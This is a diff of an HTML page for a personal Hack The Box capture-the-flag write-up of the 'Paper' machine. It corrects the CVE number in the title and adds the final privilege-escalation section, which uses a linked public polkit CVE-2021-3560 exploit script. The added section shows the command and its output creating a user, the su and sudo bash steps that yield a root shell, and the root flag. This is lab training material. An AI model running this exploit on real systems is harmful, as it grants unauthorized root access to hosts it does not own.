@@ -52,7 +52,7 @@
       </div>
     </div>
     
-        <h1 style="font-size:60px;font-family:Courier New;">Paper and CVE-2021-3650<sub style="font-size:13px">by suppi</sub></h1>
+        <h1 style="font-size:60px;font-family:Courier New;">Paper and CVE-2021-3560<sub style="font-size:13px">by suppi</sub></h1>
     <div class="entry-content">
 <h1 id="introduction">Introduction</h1>
 <p>I do htb ctf and I'm tryin' to be better every day. This time we gonna exploit polkit vulnerability again. Now let's cut to the chase and root this server.
@@ -206,9 +206,66 @@ In this case, simply reversing the order of the returned elements suffices and `
     
     </pre></div>
 <figure class="wp-block-image size-large"><img data-attachment-id="724" data-permalink="https://suppi147.github.io/suppisWriteup/suppi/" data-orig-file="https://suppi147.github.io/suppisWriteup/suppi/cve2.png" data-orig-size="999,562" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="ssh" data-image-description="" data-image-caption="" data-medium-file="https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=300" data-large-file="https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=750" src="https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=999" alt="" class="wp-image-724" srcset="https://suppi147.github.io/suppisWriteup/suppi/cve2.png 999w, https://suppi147.github.io/suppisWriteup/suppi/php.png?w=150 150w, https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=300 300w, https://suppi147.github.io/suppisWriteup/suppi/cve2.png?w=768 768w" sizes="(max-width: 999px) 100vw, 999px" /><figcaption><strong>CVE-2021-3560</strong></figcaption></figure>
+<p>I upload the <a href="https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh">script</a> then give execute permission to the file then execute it. ./s.sh -u=khoi -p=1.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(dwight@paper)-&#91;~]
+./s.sh -u=khoi -p=1
+[!] Username set as : khoi
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username khoi...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username khoi  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - khoi
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
+    </pre></div>
+<p>In final, I change user right to my created user(khoi) with su - khoi type my password in then I successfully run root with my user authority. And yeah we own the server.</p>
+<div class="wp-block-syntaxhighlighter-code "><pre class="brush: bash; title: ; notranslate" title="">┌──(dwight@paper$)-&#91;~]
+[dwight@paper kkk]$ su - khoi
+su - khoi
+Password: 1
 
+[khoi@paper ~]$ sudo bash
+sudo bash
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for khoi: 1
+
+[root@paper khoi]# ls
+ls
+[root@paper khoi]# cd ..
+cd ..
+[root@paper home]# cd 
+cd 
+[root@paper ~]# ls
+ls
+anaconda-ks.cfg  initial-setup-ks.cfg  root.txt
+[root@paper ~]# cat ro  
+cat root.txt 
+4a22ffbd0af3c550b91cd7c84e54c4ed
+[root@paper ~]# 
+    </pre></div>
     <!-- +++++ Projects Section +++++ -->
-        
+
     <div class="container pt">
         <div class="row mt">
             <div class="col-lg-6 col-lg-offset-3 centered">
